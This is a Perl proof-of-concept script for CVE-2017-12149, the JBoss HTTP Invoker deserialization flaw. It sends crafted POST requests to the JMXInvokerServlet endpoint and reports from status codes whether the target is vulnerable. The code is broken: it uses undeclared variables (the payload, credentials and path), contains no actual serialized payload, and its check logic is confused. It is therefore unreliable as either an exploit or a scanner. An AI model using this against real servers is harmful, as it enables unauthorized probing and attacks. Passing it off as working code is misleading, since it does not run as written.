#!/usr/bin/perl

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use HTTP::Response;

# Global Variables
my $url = 0;
$url = $ARGV[0] or help();

# Display The Header
header();

# Run The PoC
exploit($url);


sub header {
    print "\n\n";
    my $title = "=================================[ text-white ]=================================";
    
    print qq{
$title
            
   Reporter : <AUTHOR>
       Date : <DATE>
        CVE : CVE-2017-12149
            
Description :


In Jboss Application Server as shipped with Red Hat Enterprise
Application Platform 5.2, it was found that the doFilter method in the
ReadOnlyAccessFilter of the HTTP Invoker does not restrict classes for
which it performs deserialization and thus allowing an attacker to
execute arbitrary code via crafted serialized data.


};
    print "="x(length($title)) . "\n\n";
}

sub help {
    print "\n";
    print qq {  
        # Usage : perl $0 <url>        
    };
    print "\n\n";
    exit;
}

sub buildRequester {
    my ( $useragent, $timeout, $proxy ) = @_;
    $proxy = 0 if(!defined($proxy));
    my $browser = 0;
    my $cookie_jar = 0;
    
    $cookie_jar = HTTP::Cookies->new(
        file     => "/tmp/cookies.lwp",
        autosave => 1,
    );
    
    $browser = LWP::UserAgent->new();
    $browser->protocols_allowed( [qw( http https ftp )] );
    $browser->requests_redirectable(['GET', 'POST', 'HEAD', 'OPTIONS']);
    $browser->cookie_jar( $cookie_jar);
    
    ### Custom Options
    $browser->timeout($timeout);
    $browser->agent($useragent);
    
    if($proxy) {
        $browser->proxy( [qw( http https ftp ftps )] => $proxy);
    }
    
    return $browser;
}

sub buildRequest {
    my ( $url, $method, $payload, $content_type) = @_;
    $content_type = 'application/x-www-form-urlencoded' if(!defined($content_type));
    $payload = '' if(!defined($payload));
    $method = uc($method);
    my $request = 0;
    
    if($method eq "GET") {
        $request = new HTTP::Request $method, $url . '?' . $payload;
    } else {
        $request = new HTTP::Request $method, $url;
        $request->content($payload);
    }
    $request->content_type($content_type);
    
    return $request;
}

sub exploit {
    my ( $url ) = @_;
    my $browser = 0;
    my $useragent = '';
    my $request = 0;
    my $response = 0;
    my $proxy = 0;
    my $vulnerable = 1;
    my $timeout = 30;
    
    ### Setting Up The Requester
    $browser = buildRequester($useragent, $timeout, $proxy);
    
    ### Build/send the requests

  # Request : EXPLOIT2
  print "[*] Sending Injection Using User : $username On : $path\n";
  $request = buildRequest($url . "/invoker/readonly/JMXInvokerServlet/", "POST", "$payload", "application/x-www-form-urlencoded");
  $request->headers("Authorization" => "Basic $b64_credentials");
  $response = $browser->request($request);
  print "\t => " . $request->uri . " (" . $response->code . ")\n\n";

$vulnerable = 0 if(!validate("TCODE", "200", $response));

  # Request : EXPLOIT1
  print "[*] Sending Detection Request To Check Affected Directory Existences : $path\n";
  $request = buildRequest($url . "/invoker/readonly/JMXInvokerServlet/", "POST", "", "application/x-www-form-urlencoded");
  $response = $browser->request($request);
  print "\t => " . $request->uri . " (" . $response->code . ")\n\n";

$vulnerable = 0 if(!validate("TCODE", "401", $response));
    
    
    ### Validate or not the test
    if($vulnerable) {
        print "[VULNERABLE] $url is affected or any kind of validation was provided.\n";
    } else {
        print "[NOT VULNERABLE] $url is not affected.\n";
    }
}

sub validate {
    my ( $validation_mode, $validation_value, $response ) = @_;
    my $value = 0;
    my $positive = 1;
    my $type = substr($validation_mode, 1, length($validation_mode));
    
    $positive = 0 if(substr(uc($validation_mode), 0, 1) eq 'F');
    
    given(substr($validation_mode, 1, length($validation_mode))) {
        
        when(/CODE/i) { $value = $response->code; }
        
        when(/SIZE/i) { $value = length($response->content); }
        
        when(/STRING|REGEX/i) {  $value = $response->content; }
        
        when(/HEADER/i) {
            my @header_parts = split(':', $validation_value);
            
            if($header_parts[0]) {
                if($response->header($header_parts[0])) {
                    if($header_parts[1]) {
                        return $positive if($response->header($header_parts[0]) =~ $header_parts[1]);
                    } else {
                        return $positive;
                    }
                } else {
                    return 0;
                }
            } else {
                return 0;
            }
        }
    }
    
    if($validation_value && $validation_value =~ /$value/i || $validation_value eq $value) {
        return $positive;
    }
    
    return 0;
}
